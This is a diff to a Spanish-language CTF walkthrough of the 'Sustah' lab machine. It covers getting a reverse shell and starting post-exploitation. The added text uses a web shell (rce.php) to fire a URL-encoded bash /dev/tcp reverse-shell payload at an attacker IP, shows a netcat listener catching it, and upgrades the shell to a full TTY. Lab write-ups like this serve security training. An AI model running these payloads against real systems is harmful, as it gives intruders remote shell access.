@@ -210,11 +210,48 @@ Ejecutamos nuestro rce y vemos que funciona
 
 ## Obtenemos Reverse Shell
 
+-Nos ponemos en escucha con netcat en nuestra maquina a la espera de la shell
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
+    └─# nc -lnvp 1988                                          
+    listening on [any] 1988 ...
+    connect to [10.9.92.151] from (UNKNOWN) [10.10.171.9] 57992
+    bash: cannot set terminal process group (1225): Inappropriate ioctl for device
+    bash: no job control in this shell
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ 
+
+-Ejecutamos la reverse shell a traves de la url
+
+        http://10.10.171.9/YouGotTh3P@th/img/rce.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.92.151%2F1988%200%3E%261%27
 
 
+## Post Explotacion Escalada de privilegios y obtencion de flags.
 
+-Upgradeamos la reverse shell a full tty para poder trabajar mas comodamente y no perder la conexion
 
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
+    └─# nc -lnvp 1988                                          
+    listening on [any] 1988 ...
+    connect to [10.9.92.151] from (UNKNOWN) [10.10.171.9] 57992
+    bash: cannot set terminal process group (1225): Inappropriate ioctl for device
+    bash: no job control in this shell
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+    </www/html/YouGotTh3P@th/img$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+    
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ ^Z
+    zsh: suspended  nc -lnvp 1988
+                                                                                                                                                                                  
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
+    └─# stty raw -echo && fg 
+    [1]  + continued  nc -lnvp 1988
+    
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ stty rows 43 columns 174
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ stty rows 43 columns 174 
+    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ 
 
+-Obtenemo la flag de usuario
+
+    
 
 
 
